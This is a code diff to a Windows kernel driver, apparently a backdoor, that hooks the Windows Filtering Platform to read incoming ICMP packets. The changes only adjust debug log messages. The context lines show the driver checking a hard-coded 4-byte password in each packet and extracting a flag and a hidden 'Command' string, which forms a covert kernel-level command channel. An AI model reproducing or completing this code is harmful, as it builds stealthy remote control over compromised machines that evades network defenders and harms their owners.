@@ -8,41 +8,41 @@ NTSTATUS WfpInit(PDRIVER_OBJECT driverObject) {
     // Create a device object (used in the callout registration)
     NTSTATUS status = IoCreateDevice(driverObject, 0, NULL, FILE_DEVICE_UNKNOWN, 0, FALSE, &filterDeviceObject);
     if (!NT_SUCCESS(status)) {
-        KdPrint(("[PER Driver] Failed to create the filter device object (0x%X).\n", status));
+        KdPrint(("[PER Driver] Failed to create the filter device object (0x%X)\n", status));
         return status;
     }
 
     // Open a session to the filter engine
     status = FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engineHandle);
     if (!NT_SUCCESS(status)) {
-        KdPrint(("[PER Driver] Failed to open the filter engine (0x%X).\n", status));
+        KdPrint(("[PER Driver] Failed to open the filter engine (0x%X)\n", status));
         return status;
     }
     
     status = CalloutRegister();
     if (!NT_SUCCESS(status)) {
-        KdPrint(("[PER Driver] Failed to register the filter callout (0x%X).\n", status));
+        KdPrint(("[PER Driver] Failed to register the filter callout (0x%X)\n", status));
         return status;
     }
 
     // Add the callout to the system
     status = CalloutAdd();
     if (!NT_SUCCESS(status)) {
-        KdPrint(("[PER Driver] Failed to add the filter callout (0x%X).\n", status));
+        KdPrint(("[PER Driver] Failed to add the filter callout (0x%X)\n", status));
         return status;
     }
 
     // Add a sublayer to the system
     status = SublayerAdd();
     if (!NT_SUCCESS(status)) {
-        KdPrint(("[PER Driver] Failed to add the sublayer (0x%X).\n", status));
+        KdPrint(("[PER Driver] Failed to add the sublayer (0x%X)\n", status));
         return status;
     }
 
     // Add a filtering rule to the added sublayer
     status = FilterAdd();
     if (!NT_SUCCESS(status)) {
-        KdPrint(("[PER Driver] Failed to add the filter (0x%X).\n", status));
+        KdPrint(("[PER Driver] Failed to add the filter (0x%X)\n", status));
         return status;
     }
 
@@ -92,7 +92,7 @@ VOID CalloutFilter(
     UINT32 payloadLength = dataLength - 4 - 1;         // ICMP payload size = ICMP packet size - ICMP header size - 4 (password size) - 1 (reserved flag size) 
 
     if (dataLength <= 4 || dataLength >= 1473) {
-        KdPrint(("[PER Driver] Wrong data length in ICMP, skipping"));
+        KdPrint(("[PER Driver] Wrong data length in ICMP, skipping\n"));
         return;
     }
 
@@ -111,7 +111,7 @@ VOID CalloutFilter(
     RtlCopyMemory(icmpPassword, &icmpPacket[8], 4);
 
     if (!RtlEqualMemory(icmpPassword, PASSWORD, 4)) {
-        KdPrint(("[PER Driver] Invalid password in ICMP packet"));
+        KdPrint(("[PER Driver] Invalid password in ICMP packet\n"));
         goto freeBuffer;
     }
 
@@ -128,9 +128,9 @@ VOID CalloutFilter(
 
     icmpPayload[payloadLength] = '\0';
 
-    KdPrint(("[PER Driver] Password: {0x%x, 0x%x, 0x%x, 0x%x}", icmpPassword[0], icmpPassword[1], icmpPassword[2], icmpPassword[3]));
-    KdPrint(("[PER Driver] Flag: 0x%x", icmpFlag));
-    KdPrint(("[PER Driver] Command: %s", icmpPayload));
+    KdPrint(("[PER Driver] Password: {0x%x, 0x%x, 0x%x, 0x%x}\n", icmpPassword[0], icmpPassword[1], icmpPassword[2], icmpPassword[3]));
+    KdPrint(("[PER Driver] Flag: 0x%x\n", icmpFlag));
+    KdPrint(("[PER Driver] Command: %s\n", icmpPayload));
 
     ExFreePoolWithTag((PVOID)icmpPayload, ALLOC_TAG_NAME);
 
@@ -204,7 +204,7 @@ VOID Cleanup() {
 }
 
 VOID TermCalloutIds() {
-    DbgPrint("Terminating callout identifiers.\n");
+    KdPrint(("[PER Driver] Terminating callout identifiers\n"));
 
     if (engineHandle) {
 
@@ -231,7 +231,7 @@ VOID TermCalloutIds() {
 }
 
 VOID TermWfpEngine() {
-    DbgPrint("Terminating the filter engine handle.\n");
+    KdPrint(("[PER Driver] Terminating the filter engine handle\n"));
 
     if (engineHandle) {
         FwpmEngineClose(engineHandle);
@@ -240,7 +240,7 @@ VOID TermWfpEngine() {
 }
 
 VOID TermFilterDeviceObject() {
-    DbgPrint("Terminating the device object.\n");
+    KdPrint(("[PER Driver] Terminating the device object\n"));
 
     if (filterDeviceObject) {
         IoDeleteDevice(filterDeviceObject);
